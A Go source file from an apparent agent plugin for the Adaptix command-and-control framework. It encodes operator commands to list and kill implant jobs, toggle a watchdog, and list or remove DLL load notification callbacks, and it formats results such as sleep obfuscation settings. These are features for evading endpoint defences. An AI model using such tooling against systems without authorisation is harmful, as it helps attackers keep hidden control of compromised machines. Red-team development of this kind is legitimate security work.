package main

import (
	"encoding/binary"
	"fmt"
	"strconv"
	"strings"

	adaptix "github.com/Adaptix-Framework/axc2/v2"
)

func cmdJob(agentData adaptix.AgentData, args map[string]any) (adaptix.TaskData, adaptix.ConsoleMessageData, error) {
	subcommand := adaptix.GetStringArgDefault(args, "subcommand", "")
	switch subcommand {
	case "list":
		data := []byte{CMD_JOB_LIST, 0, 0, 0, 0}
		task := adaptix.TaskData{Type: taskTypeTask, Data: data, Sync: true}
		msg := adaptix.ConsoleMessageData{Status: messageSeverityInfo, Message: "listing jobs..."}
		return task, msg, nil

	case "kill":
		taskIdStr := adaptix.GetStringArgDefault(args, "task_id", "")
		taskIdVal, parseErr := strconv.ParseUint(taskIdStr, 16, 32)
		if parseErr != nil {
			return adaptix.TaskData{}, adaptix.ConsoleMessageData{},
				fmt.Errorf("nonameax: job kill: invalid task ID %q", taskIdStr)
		}
		data := make([]byte, 9)
		data[0] = CMD_JOB_KILL
		binary.LittleEndian.PutUint32(data[1:5], 4)
		binary.LittleEndian.PutUint32(data[5:9], uint32(taskIdVal))
		task := adaptix.TaskData{Type: taskTypeTask, Data: data, Sync: true}
		msg := adaptix.ConsoleMessageData{Status: messageSeverityInfo, Message: fmt.Sprintf("killing job 0x%08x...", uint32(taskIdVal))}
		return task, msg, nil

	default:
		return adaptix.TaskData{}, adaptix.ConsoleMessageData{},
			fmt.Errorf("nonameax: job: unknown subcommand %q", subcommand)
	}
}

func cmdWatchdog(agentData adaptix.AgentData, args map[string]any) (adaptix.TaskData, adaptix.ConsoleMessageData, error) {
	subcommand := adaptix.GetStringArgDefault(args, "subcommand", "")
	var enable byte
	switch strings.ToLower(subcommand) {
	case "on", "1", "true":
		enable = 1
	case "off", "0", "false":
		enable = 0
	default:
		return adaptix.TaskData{}, adaptix.ConsoleMessageData{},
			fmt.Errorf("nonameax: watchdog: state must be 'on' or 'off'")
	}
	data := make([]byte, 6)
	data[0] = CMD_WATCHDOG_SET
	binary.LittleEndian.PutUint32(data[1:5], 1)
	data[5] = enable
	label := map[byte]string{0: "off", 1: "on"}[enable]
	task := adaptix.TaskData{Type: taskTypeTask, Data: data, Sync: true}
	msg := adaptix.ConsoleMessageData{
		Status:  messageSeverityInfo,
		Message: fmt.Sprintf("watchdog %s queued", label),
	}
	return task, msg, nil
}

func cmdDllNotify(agentData adaptix.AgentData, args map[string]any) (adaptix.TaskData, adaptix.ConsoleMessageData, error) {
	subcommand := adaptix.GetStringArgDefault(args, "subcommand", "")
	switch subcommand {
	case "list":
		task := adaptix.TaskData{
			Type: taskTypeTask,
			Data: []byte{CMD_DLL_NOTIFY_LIST, 0x00, 0x00, 0x00, 0x00},
			Sync: true,
		}
		msg := adaptix.ConsoleMessageData{Status: messageSeverityInfo, Message: "dll-notify list queued"}
		return task, msg, nil
	case "remove":
		task := adaptix.TaskData{
			Type: taskTypeTask,
			Data: []byte{CMD_DLL_NOTIFY_REMOVE, 0x00, 0x00, 0x00, 0x00},
			Sync: true,
		}
		msg := adaptix.ConsoleMessageData{Status: messageSeverityInfo, Message: "dll-notify remove queued"}
		return task, msg, nil
	default:
		return adaptix.TaskData{}, adaptix.ConsoleMessageData{},
			fmt.Errorf("nonameax: dll-notify: unknown subcommand %q", subcommand)
	}
}

func resultJobList(data []byte) (string, string) {
	if len(data) < 4 {
		return string(data), ""
	}
	count := binary.LittleEndian.Uint32(data[0:4])
	var lines []string
	lines = append(lines, fmt.Sprintf("Active jobs: %d", count))
	lines = append(lines, fmt.Sprintf(" %-10s  %-10s  %s", "Task ID", "State", "Elapsed"))
	lines = append(lines, fmt.Sprintf(" %-10s  %-10s  %s", "-------", "-----", "-------"))
	off := 4
	for i := uint32(0); i < count && off+9 <= len(data); i++ {
		tid := binary.LittleEndian.Uint32(data[off : off+4])
		state := data[off+4]
		elapsed := binary.LittleEndian.Uint32(data[off+5 : off+9])
		stateStr := "unknown"
		switch state {
		case 0:
			stateStr = "pending"
		case 1:
			stateStr = "running"
		case 2:
			stateStr = "finished"
		case 3:
			stateStr = "killed"
		case 4:
			stateStr = "abandoned"
		}
		lines = append(lines, fmt.Sprintf(" %08x    %-10s  %ds", tid, stateStr, elapsed))
		off += 9
	}
	return lines[0], strings.Join(lines, "\n")
}

func resultWatchdog(status byte, data []byte) (string, string) {
	if status == STATUS_OK && len(data) >= 1 {
		state := map[byte]string{0: "off", 1: "on"}[data[0]]
		return fmt.Sprintf("watchdog %s", state), ""
	}
	return "watchdog: command failed", ""
}

func resultSleepobfConfig(status byte, data []byte) (string, string) {
	if status == STATUS_OK && len(data) >= 2 {
		onOff := func(b byte) string {
			if b == 1 {
				return "on"
			}
			return "off"
		}
		return fmt.Sprintf("Sleep obfuscation config updated:\n  sleep_obf:    %s",
			onOff(data[0])), ""
	}
	return "sleepobf-config: command failed", ""
}
